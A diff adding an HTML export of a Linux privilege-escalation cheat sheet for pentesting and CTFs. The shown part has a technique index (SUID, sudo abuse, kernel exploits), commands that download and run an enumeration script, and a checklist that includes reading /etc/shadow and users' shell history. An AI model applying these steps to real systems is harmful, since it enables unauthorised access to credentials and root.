@@ -1,0 +1,744 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Linux - Privilege Escalation</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	opacity: 0.5;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif; }
+.mono { font-family: Nitti, 'Microsoft YaHei', '微软雅黑', monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, Nitti, 'Microsoft YaHei', '微软雅黑', monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2dfc3892-4f85-4e14-9251-bd4e7404491e" class="page sans"><header><h1 class="page-title">Linux - Privilege Escalation</h1></header><div class="page-body"><p id="094c7e30-c6c2-4660-89dc-79b670792ac4" class="">
+</p><figure id="f15f7ea7-ceb2-4828-95aa-15f751cd99f6" class="link-to-page"><a href="Linux%20Privilege%20Escalation/Reads.html">Reads</a></figure><figure id="4b9234ef-2016-4ae1-940c-72fbbf813955" class="link-to-page"><a href="Linux%20Privilege%20Escalation/Tools.html">Tools</a></figure><figure id="ae1e016e-0e8f-4275-b823-52d30d03c272" class="link-to-page"><a href="Linux%20Privilege%20Escalation/Practice.html">Practice</a></figure><p id="975fd0fb-ee3e-4cc2-9e73-1bd2eebaf352" class="">
+</p><ul id="bed06675-82dd-46e5-9b72-dd53ef27ed8a" class="toggle"><li><details open=""><summary><mark class="highlight-orange"><strong>Contents</strong></mark></summary><nav id="66fe5afb-cc9d-4723-b417-f44bb14c26b3" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d9109889-33ac-4b0c-9c2e-ff10df48b5cd">Tools</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ce83c5bc-997e-458b-bea1-b243cfa87590">Checklists</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#5db48da8-cf9f-4676-bf03-4692d7c07942">Looting for passwords</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1b1d8e7f-4c32-4054-b40b-98eb825ab48d">Files containing passwords</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f58329f2-c7c6-48a1-a9ba-0c32e6758c4a">Old passwords in /etc/security/opasswd</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6f02a847-49c7-42e5-81a8-e41f38012863">Last edited files</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#81f9c3b0-caa6-4691-abfd-18c6935285cd">In memory passwords</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#773e4b30-e316-4e83-8552-ecf18c0735c5">Find sensitive files</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f1f43a85-20db-49cb-a39a-2f63d49734a3">Scheduled tasks</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b47a87c6-56ad-4fe9-bb6a-92fc17ee99f2">Cron jobs</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#428a332c-cec5-48f6-a85f-d3a8e6ce6035">Systemd timers</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#70b85ef8-acaf-4797-8046-8bdd769d55c3">SUID</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c60bcb8b-36e4-4b27-a497-415f27131ee1">Find SUID binaries</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5a963e39-8a94-423a-8488-ff21164e2300">Create a SUID binary</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d00027a2-a11f-497b-b895-345822b52366">Capabilities</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e741a6e1-80de-405a-a8d7-f29e5781a2f5">List capabilities of binaries</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7434b588-33bf-4c3f-a735-ebd3b689838b">Edit capabilities</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8de9c1f9-55ca-40c7-b40f-1fc044ceb8ff">Interesting capabilities</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#05ea8bae-c1ff-480f-9e8e-aac6d6eb26a4">SUDO</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8d71bfd4-4751-4d96-b24b-dc5f2bb7d5c0">NOPASSWD</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4c5d9c5e-e7b9-425e-a828-06428efc213a">LD_PRELOAD and NOPASSWD</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1db1be80-dbf0-4152-a826-c08239ad81ac">Doas</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#529a7014-6837-4ded-ab24-7b265fc17f38">sudo_inject</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#0e0840fe-7c0c-4fd2-8e7f-0718bb1f4426">GTFOBins</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#e75b062a-a117-4858-bcba-f9cda99cbef7">Wildcard</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#b9eeb552-12e8-48d4-bb7a-a49d70d0bb80">Writable files</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ccef80bc-b8fb-455c-ad2f-b326f310b27b">Writable /etc/passwd</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#94eef76d-b6d2-4c85-be90-1fe974e70fb1">Writable /etc/sudoers</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1eb1478e-0261-4a5f-93a7-3e31c33cc743">NFS Root Squashing</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#b0ed2418-39cb-4b0c-b5c6-627718126f24">Shared Library</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7cab88b7-fc87-40d8-a2fa-d0349e977ecc">ldconfig</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#bd878e9b-66dd-4fcd-8b14-7d4b257f0df1">RPATH</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#8286b4cc-cc84-424d-9149-94814a54978b">Groups</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#39ce6e2b-6619-4a8d-8273-02b38ab0556b">Docker</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ae7c60e3-df5b-46fd-8b30-70c3479b5108">LXC/LXD</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d5dbfc0d-b15e-44b4-9321-d970efe14609">Kernel Exploits</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#087e2ec2-aa9e-46e7-aff4-a0d54193688b">CVE-2016-5195 (DirtyCow)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9bcc92a1-b9e0-4768-8cef-0e07c647d34b">CVE-2010-3904 (RDS)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ac3f4692-079c-48a6-b7a6-a07558baebdd">CVE-2010-4258 (Full Nelson)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6b4d13f9-2f0a-4252-85ff-622c0cd7d4e1">CVE-2012-0056 (Mempodipper)</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#40ef112a-11db-4be0-90c1-2bedd35aff46">References</a></div></nav></details></li></ul><h2 id="d9109889-33ac-4b0c-9c2e-ff10df48b5cd" class="">Tools</h2><ul id="4b8ca9ae-2d1f-460b-bd69-fa505338344c" class="bulleted-list"><li><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a><pre id="f0f298b1-c321-4487-8556-94ee674ba07c" class="code"><code>wget &quot;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&quot; -O lse.sh
+curl &quot;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&quot; -o lse.sh
+./lse.sh -l1 # shows interesting information that should help you to privesc
+./lse.sh -l2 # dump all the information it gathers about the system</code></pre></li></ul><ul id="8f8cf04f-3327-4915-aa92-0ba325163ced" class="bulleted-list"><li><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a><pre id="c62b154b-878d-4b5e-a661-a5425c78b2ce" class="code"><code>./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</code></pre></li></ul><ul id="45b73489-3a70-4d55-bfc7-c023563e381a" class="bulleted-list"><li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></li></ul><ul id="af731a43-0197-49bd-bab6-ce2ec6f6602b" class="bulleted-list"><li><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></li></ul><ul id="b27a558b-c57f-4775-801e-717597c5990f" class="bulleted-list"><li><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></li></ul><ul id="ad1688d5-cbd4-4d0e-b27f-5c13f0127296" class="bulleted-list"><li><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></li></ul><h2 id="ce83c5bc-997e-458b-bea1-b243cfa87590" class="">Checklists</h2><ul id="aadb1855-d064-494b-9eda-bb62cf3a6aa9" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Kernel and distribution release details</span></li></ul><ul id="b857d233-d6bf-4a7f-9994-2bad494cd27b" class="toggle"><li><details open=""><summary>System Information:</summary><ul id="173b8ee4-da35-45d8-8454-a372b1cb2b4d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Hostname</span></li></ul><ul id="8001054f-54bc-44ee-bd89-490ba4fde5cf" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Networking details:</span></li></ul><ul id="9d1bc3a0-6f66-4b3c-8826-d590b99aba35" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Current IP</span></li></ul><ul id="ec8ad6d9-650a-42c3-92ae-f3861fa6dc44" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Default route details</span></li></ul><ul id="f49bf36e-e7e5-4cfc-a284-7f1f2b8aba08" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">DNS server information</span></li></ul></details></li></ul><ul id="0b2ede03-0711-44ab-bb14-e8ed59684994" class="toggle"><li><details open=""><summary>User Information:</summary><ul id="43a2b7bf-3d57-4ac9-9463-7955600dde3a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Current user details</span></li></ul><ul id="0bfeb1ba-91e6-46f6-8471-57ac61a8c4c8" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Last logged on users</span></li></ul><ul id="7f3f2a36-1bad-4908-ac16-b597c246584a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Shows users logged onto the host</span></li></ul><ul id="06795f31-c2a2-431a-b6f4-45ae83306b93" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List all users including uid/gid information</span></li></ul><ul id="f5172f6d-b2b7-4b3f-b1c0-0138bd72e30b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List root accounts</span></li></ul><ul id="8eac79b4-0e60-43a2-a1dc-ef22c20b3f88" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Extracts password policies and hash storage method information</span></li></ul><ul id="64074d20-8a8b-4244-80cc-bb1e8661f390" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks umask value</span></li></ul><ul id="c4ba98ec-b87c-49d1-87ff-dd4ac69a5564" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks if password hashes are stored in /etc/passwd</span></li></ul><ul id="8a7ef431-8aba-4255-afb8-0ddb37fc7c4a" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Extract full details for &#x27;default&#x27; uid&#x27;s such as 0, 1000, 1001 etc</span></li></ul><ul id="f494b58d-2abb-4145-af3a-6df14b58bf3b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Attempt to read restricted files i.e. /etc/shadow</span></li></ul><ul id="333f1acb-5439-4b8c-8e43-e018848abb0e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)</span></li></ul><ul id="aea577cf-5f4c-4ca9-af3b-bac7e4b9a83f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Basic SSH checks</span></li></ul></details></li></ul><ul id="15b77f92-6688-436a-8549-c7ccfee28245" class="toggle"><li><details open=""><summary>Privileged access:</summary><ul id="d92d0136-918c-421f-a983-c6c35ee855bb" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Which users have recently used sudo</span></li></ul><ul id="1a0c883e-d1ff-4e3b-bd17-22489291bb07" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Determine if /etc/sudoers is accessible</span></li></ul><ul id="bb805031-133d-4306-b91d-ef631ecb17ad" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Determine if the current user has Sudo access without a password</span></li></ul><ul id="85330904-2723-437d-beb2-9785d5c45776" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Are known &#x27;good&#x27; breakout binaries available via Sudo (i.e. nmap, vim etc.)</span></li></ul><ul id="ef8bc10e-f0cb-4d88-950e-15058e8662bd" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Is root&#x27;s home directory accessible</span></li></ul><ul id="63f85f4d-6d13-4921-9c57-5ae49422b82f" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List permissions for /home/</span></li></ul></details></li></ul><ul id="c5b3220b-ab2b-4b98-bf5f-3136057b6ce0" class="toggle"><li><details open=""><summary>Environmental:</summary><ul id="fc53fced-64f7-4e47-982b-60dad0bdb944" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Display current $PATH</span></li></ul><ul id="0242d5f7-92d3-4914-b1b1-e9b5cff84eaf" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Displays env information</span></li></ul></details></li></ul><ul id="878898a5-f980-4557-abe9-0342622457fa" class="toggle"><li><details open=""><summary>Jobs/Tasks:</summary><ul id="d840df31-1a11-47f4-b39c-169463306c4b" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List all cron jobs</span></li></ul><ul id="02ece91d-f273-4f08-811e-622bb4512a1d" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate all world-writable cron jobs</span></li></ul><ul id="6b32aa65-8174-4d0f-beb5-4fa0298083db" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Locate cron jobs owned by other users of the system</span></li></ul><ul id="b7de8f37-034d-4ff7-86ed-6e7fb53a45ed" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List the active and inactive systemd timers</span></li></ul></details></li></ul><ul id="cec0851c-340b-44d6-8704-7f00e364a6b5" class="toggle"><li><details open=""><summary>Services:</summary><ul id="922eaadb-ef46-4fa3-9424-516312926a3e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List network connections (TCP &amp; UDP)</span></li></ul><ul id="b63122af-6166-407b-b9ca-74ca73d5bdef" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List running processes</span></li></ul><ul id="856b98e5-22b1-4483-a6be-7645fdd8632c" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Lookup and list process binaries and associated permissions</span></li></ul><ul id="b51ad402-1ed9-4f99-8c4a-d5ed323649d7" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List inetd.conf/xined.conf contents and associated binary file permissions</span></li></ul><ul id="8793b894-34ab-454f-86ef-d4c501f3bed3" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">List init.d binary permissions</span></li></ul></details></li></ul><ul id="628a40ac-0a8b-417f-b60a-c27439e13d5b" class="toggle"><li><details open=""><summary>Version Information (of the following):</summary><ul id="9923cd2b-54d8-48e5-aa47-5c97427b981e" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Sudo</span></li></ul><ul id="4e8eccb6-9eb6-4a30-a5f0-5c6361fe3b53" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">MYSQL</span></li></ul><ul id="b08cba50-51a8-4235-8557-5a310f480869" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Postgres</span></li></ul><ul id="c1b25766-0cd7-4184-8ea6-4391298b8ab3" class="toggle"><li><details open=""><summary>Apache</summary><ul id="e7a23b09-b49e-4f5e-8a20-6ed9aa8fb4ea" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Checks user config</span></li></ul><ul id="c539974d-6c33-429d-bfd6-25fd918721ae" class="to-do-list"><li><div class="checkbox checkbox-off"></div> <span class="to-do-children-unchecked">Shows enabled modules</span></li></ul><ul id="704d3d02-09de-4bd2-82ec-417562bcba32" 